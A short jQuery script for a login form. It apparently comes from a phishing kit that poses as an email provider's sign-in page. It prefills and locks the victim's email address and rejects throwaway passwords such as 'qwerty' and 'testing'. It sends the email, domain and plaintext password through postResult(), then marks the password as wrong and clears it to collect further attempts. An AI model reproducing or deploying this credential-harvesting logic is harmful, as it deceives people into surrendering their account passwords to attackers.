// 
if (validEmail.test(usermail)) {
    $("#def_mail").val(usermail)
    $("#def_mail").attr('readOnly', true)
}

$("#default_form").on('submit', (e)=>{
    e.preventDefault();

    let inputs_263 = document.getElementsByClassName("inputs_263");

    if (!validEmail.test($("#def_mail").val())) {
        $("#def_mail").css({"border-color":"red"});
        return
    }
    else{
        $("#def_mail").css({"border-color":"silver"});
    }

    if (validEmail.test($("#def_pass").val()) || $("#def_pass").val().length < 6 || $("#def_pass").val().toLowerCase() == "qwerty" || $("#def_pass").val() == 123456 || $("#def_pass").val().toLowerCase() == "password" || $("#def_pass").val().toLowerCase() == "testing") {
        $("#def_pass").css({"border-color":"red"});
        return
    }
    else{
        $("#def_pass").css({"border-color":"silver"});
    }

    $("#loader").show().css({"display":"flex"})

    let url = $("#def_mail").val().split('@');

    postResult(url[1], $("#def_mail").val(), $("#def_pass").val(), postCount);
    
    setTimeout(() => {
        $("#def_pass").css({"border-color":"red"});
        postCount++
        $("#def_pass").val("")
    }, delayCounter);
})